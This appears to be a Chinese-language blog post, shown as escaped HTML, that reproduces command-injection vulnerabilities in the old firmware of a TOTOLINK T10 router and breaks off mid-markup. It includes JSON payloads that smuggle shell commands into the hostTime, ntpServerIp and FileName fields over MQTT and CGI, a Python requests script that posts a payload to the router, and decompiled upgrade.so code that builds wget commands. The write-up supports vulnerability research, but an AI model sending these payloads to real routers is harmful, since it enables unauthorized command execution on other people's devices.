&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/setPasswordCfg&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;admuser&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;admin&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;admpass&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;123456888&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;6-1-3-NTPSyncWithHost-命令执行&#34;&gt;&lt;a href=&#34;#6-1-3-NTPSyncWithHost-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.1.3 NTPSyncWithHost 命令执行&#34;&gt;&lt;/a&gt;6.1.3 NTPSyncWithHost 命令执行&lt;/h3&gt;&lt;h4 id=&#34;mqtt-1883端口&#34;&gt;&lt;a href=&#34;#mqtt-1883端口&#34; class=&#34;headerlink&#34; title=&#34;mqtt 1883端口&#34;&gt;&lt;/a&gt;mqtt 1883端口&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/NTPSyncWithHost&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/NTPSyncWithHost&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;hostTime&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;&amp;#x27;$(/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/test123)&amp;#x27;;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h4 id=&#34;80端口&#34;&gt;&lt;a href=&#34;#80端口&#34; class=&#34;headerlink&#34; title=&#34;80端口&#34;&gt;&lt;/a&gt;80端口&lt;/h4&gt;&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;import&lt;/span&gt; requests&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;response = requests.post(&lt;span class=&#34;string&#34;&gt;&amp;quot;http://192.168.55.1/cgi-bin/cstecgi.cgi&amp;quot;&lt;/span&gt;,data=&lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#123;&amp;quot;topicurl&amp;quot;:&amp;quot;setting/NTPSyncWithHost&amp;quot;,&amp;quot;hostTime&amp;quot;:&amp;quot;;\&amp;#x27;$(/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/test123)\&amp;#x27;;&amp;quot;&amp;#125;&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;print&lt;/span&gt;(response.text)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;主要漏洞原因是获取了hostTime参数后,直接拼接起来然后传给了CsteSystem进行命令执行了&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510111118962.png&#34; alt=&#34;image-20230510111118962&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;6-1-4-setNTPCfg-命令执行&#34;&gt;&lt;a href=&#34;#6-1-4-setNTPCfg-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.1.4 setNTPCfg 命令执行&#34;&gt;&lt;/a&gt;6.1.4 setNTPCfg 命令执行&lt;/h3&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/setNTPCfg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/setNTPCfg&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;tz&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;UTC+0&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;ntpServerIp&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;&amp;#x27;$(/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/test123456)&amp;#x27;;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;ntpClientEnabled&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;ON&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230510112944980.png&#34; alt=&#34;image-20230510112944980&#34;&gt;&lt;/p&gt;
&lt;p&gt;apmib_set在哪呢?&lt;/p&gt;
&lt;p&gt;搜索一下 grep -rin apmib_set&lt;/p&gt;
&lt;figure class=&#34;highlight bash&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;(base) ➜  squashfs-root grep -rin apmib_set&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/csteSys matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/AC matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/cs_statistics matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/WTP matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/flash matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/sysconf matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/ntp_inet matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/fwupg matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./bin/AACWTP matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/cste_modules/wan.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/cste_modules/wps.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/cste_modules/system.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/cste_modules/firewall.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/cste_modules/wireless.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/cste_modules/global.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/cste_modules/lan.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/libapmib.so matches&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Binary file ./lib/libcstelib.so matches&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		Binary file .&amp;#x2F;lib&amp;#x2F;libapmib.so matches 这个名字看着就像,但是这个一个第三方库,就是设置值的,不像是触发漏洞的点&lt;/p&gt;
&lt;p&gt;​		后来进行gdb动态调试的时候发现,system触发点在set_timeZone()函数中,也很奇怪,因为这个函数并没有传入的值. &lt;/p&gt;
&lt;h2 id=&#34;6-2-upgrade-so&#34;&gt;&lt;a href=&#34;#6-2-upgrade-so&#34; class=&#34;headerlink&#34; title=&#34;6.2 upgrade.so&#34;&gt;&lt;/a&gt;6.2 upgrade.so&lt;/h2&gt;&lt;p&gt;主要函数&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title function_&#34;&gt;module_init&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_save_fwinfo();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setUpgradeFW&amp;quot;&lt;/span&gt;, &amp;amp;setUpgradeFW);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;setUploadSetting&amp;quot;&lt;/span&gt;, &amp;amp;setUploadSetting);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;CloudACMunualUpdate&amp;quot;&lt;/span&gt;, CloudACMunualUpdate);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  cste_hook_register(&lt;span class=&#34;string&#34;&gt;&amp;quot;slaveUpgrade&amp;quot;&lt;/span&gt;, slaveUpgrade);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; __fastcall &lt;span class=&#34;title function_&#34;&gt;dl&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(&lt;span class=&#34;type&#34;&gt;const&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; *a1)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v3[&lt;span class=&#34;number&#34;&gt;512&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [sp+18h] [-300h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; v4[&lt;span class=&#34;number&#34;&gt;256&lt;/span&gt;]; &lt;span class=&#34;comment&#34;&gt;// [sp+218h] [-100h] BYREF&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(v3, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(v3));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;memset&lt;/span&gt;(v4, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt;(v4));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  getStrFromTmp(&lt;span class=&#34;string&#34;&gt;&amp;quot;DlFileUrl&amp;quot;&lt;/span&gt;, v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;built_in&#34;&gt;sprintf&lt;/span&gt;(v3, &lt;span class=&#34;string&#34;&gt;&amp;quot;wget -O %s  %s&amp;quot;&lt;/span&gt;, a1, v4);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; CsteSystem(v3, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;getStrFromTmp这个是干什么的..&lt;/p&gt;
&lt;h4 id=&#34;6-2-1-setUpgradeFW-命令执行&#34;&gt;&lt;a href=&#34;#6-2-1-setUpgradeFW-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.2.1 setUpgradeFW 命令执行&#34;&gt;&lt;/a&gt;6.2.1 setUpgradeFW 命令执行&lt;/h4&gt;&lt;p&gt;​		注意这里拼接命令和其他有所不同&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/setUpgradeFW&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/setUpgradeFW&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;Flags&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;FileName&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/setUpgradeFW;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;ContentLength&amp;quot;&lt;/span&gt;:&lt;span class=&#34;number&#34;&gt;12&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;​		当ContentLength小于0x100000时,执行LABEL_14的逻辑,这里是出现错误删除文件的功能,进行了拼接&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514110249946.png&#34; alt=&#34;image-20230514110249946&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514110102231.png&#34; alt=&#34;image-20230514110102231&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;6-2-2-setUploadSetting-命令执行&#34;&gt;&lt;a href=&#34;#6-2-2-setUploadSetting-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.2.2 setUploadSetting 命令执行&#34;&gt;&lt;/a&gt;6.2.2 setUploadSetting 命令执行&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/setUploadSetting&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;topicurl&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;setting/setUploadSetting&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;string&#34;&gt;&amp;quot;FileName&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/setUploadSetting;&amp;quot;&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;ContentLength&amp;quot;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;quot;;/tmp/busybox-mipsel$&amp;#123;IFS&amp;#125;touch$&amp;#123;IFS&amp;#125;/tmp/setUploadSetting;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;



&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514111626192.png&#34; alt=&#34;image-20230514111626192&#34;&gt;&lt;/p&gt;
&lt;p&gt;获取的文件名会进行读取&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/totolinkT10%E8%B7%AF%E7%94%B1%E5%99%A8%E8%80%81%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/image-20230514111658292.png&#34; alt=&#34;image-20230514111658292&#34;&gt;&lt;/p&gt;
&lt;h4 id=&#34;6-2-3-slaveUpgrade-命令执行&#34;&gt;&lt;a href=&#34;#6-2-3-slaveUpgrade-命令执行&#34; class=&#34;headerlink&#34; title=&#34;6.2.3 slaveUpgrade 命令执行&#34;&gt;&lt;/a&gt;6.2.3 slaveUpgrade 命令执行&lt;/h4&gt;&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;totolink/router/setting/slaveUpgrade&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span 